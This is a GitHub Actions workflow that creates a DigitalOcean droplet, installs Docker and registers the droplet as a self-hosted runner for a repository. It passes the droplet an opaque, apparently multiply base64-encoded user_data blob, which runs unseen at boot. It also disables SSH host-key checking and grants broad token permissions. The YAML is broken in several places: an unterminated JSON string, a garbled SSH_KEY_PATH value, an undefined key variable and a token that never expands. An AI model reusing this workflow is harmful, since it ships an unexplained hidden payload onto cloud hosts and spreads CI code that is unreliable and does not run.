name: DO Bridge - Zer0-Step Final

on:
  workflow_dispatch:
  push:
    paths:
      - 'tasks.txt'

permissions:
  contents: write
  actions: write
  pull-requests: write
  id-token: write
  security-events: write
  checks: write

jobs:
  do-bridge:
    runs-on: ubuntu-latest
    env:
      FORCED_JAVASCRIPT_TO_NODE24: true
      GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
    steps:
      - name: Checkout repo
        uses: actions/checkout@v4

      - name: Create DigitalOcean Droplet
        id: create-droplet
        env:
          DO_TOKEN: ${{ secrets.DO_TOKEN }}
        run: |
          TOKEN="${{ env.GITHUB_TOKEN }}"
          curl -s -X POST https://api.digitalocean.com/v2/droplets \
            -H "Authorization: Bearer $DO_TOKEN" \
            -H "Content-Type: application/json" \
            -d '{
              "name" : "aria-host-droplet",
              "region" : "nyc3",
              "size" : "s-2vcpu-4gb",
              "image" : "ubuntu-22-04-x64",
              "user_data" : "LyY2WVcxYzJONlNrZGhSMDE1VFc1c2FGWXlVbk5UVldNd1lURndXRTVVUW10VFJrcHpWRVpXYTJReVVuUlBXR3hOWW10d2IxbDZTbTVRVkRBOUln
              f'
          sleep 120

      - name: Get Droplet IP
        env:
          DO_TOKEN: ${{ secrets.DO_TOKEN }}
        run: |
          IP=$(curl -s -X GET "https://api.digitalocean.com/v2/droplets?page=1&per_page=100" -H "Authorization: Bearer $DO_TOKEN" | python3 -c "import sys, json; d=json.load(sys.stdin); print([x['public_ips'][0] for x in d['droplets'] if x['name']=='aria-host-droplet'][0])")
          echo "IP=$IP" >> $GITHUB_ENV

      - name: Setup Docker on Droplet
        run: |
          echo "Setting up Docker on droplet IP: $IP"
          SSH_KEY=$(cat $SSH_KEY_PATH)
          ssh -o StrictHostKeyChecking=no -i $SSH_KEY_PATH root@$IP << 'EOF'
            curl -fsSL https://get.docker.com -o get-docker.sh
            sh get-docker.sh
            usermod -aG docker ubuntu
            systemctl enable docker
            systemctl start docker
            echo "Docker installed successfully"
          EOF

      - name: Fetch GitHub Actions Runner Registration Token
        run: |
          echo "Installing jq for JSON parsing"
          apt-get install -y jq
          echo "Fetching fresh registration token from GitHub API"
          REGISTRATION_TOKEN=$(curl -s -X POST -H "Authorization: token ${{ secrets.GH_PAT }}" -H "Accept: application/vnd.github.v3+json" https://api.github.com/repos/aria-agentworks/-agentworks-bridge/actions/runners/registration-token | jq -r .token)
          echo "RUNNER_REGISTRATION_TOKEN=$REGISTRATION_TOKEN" >> $GITHUB_ENV
          echo "Registration token fetched successfully"

      - name: Download GitHub Actions Runner
        run: |
          echo "Downloading GitHub Actions Runner on droplet: $IP"
          ssh -o StrictHostKeyChecking=no -i $SSH_KEY_PATH root@$IP << 'EOF'
            cd /home/ubuntu
            curl -L -o actions-runner-linux-x64-2.313.0.tar.gz https://github.com/actions/runner/releases/download/v2.313.0/actions-runner-linux-x64-2.313.0.tar.gz
            tar xzf actions-runner-linux-x64-2.313.0.tar.gz
          EOF

      - name: Configure and Register GitHub Actions Runner
        run: |
          echo "Registering runner on droplet: $IP"
          ssh -o StrictHostKeyChecking=no -i $SSH_KEY_PATH root@$IP << 'EOF'
            cd /home/ubuntu/actions-runner
            ./config.sh --url https://github.com/aria-agentworks/-agentworks-bridge --token $RUNNER_REGISTRATION_TOKEN --name aria-runner --unattended
            echo "Runner configured and registered"
          EOF
        env:
          RUNNER_REGISTRATION_TOKEN: ${{ env.RUNNER_REGISTRATION_TOKEN }}
          SSH_KEY_PATH: $SSH_KEY_PATH (

      - name: Write Results
        run: |
          echo "=== DO DROPLET CREATED ===" >> result.txt
          echo "Droplet Name: aria-host-droplet" >> result.txt
          echo "Public IP: $IP" >> result.txt
          echo "=== READY ===" >> result.txt
          echo "=== GP-TEAMS DEPLOYMENT READS ===" >> result.txt

      - name: Commit and push results
        run: |
          git config user.email "github-actions[bot]@users.noreply.github.com"
          git config user.name "github-actions[bot]"
          git add result.txt
          git commit -m "DO droplet deployed" || echo "Skipped commit"
          git push || echo "Skipped push"
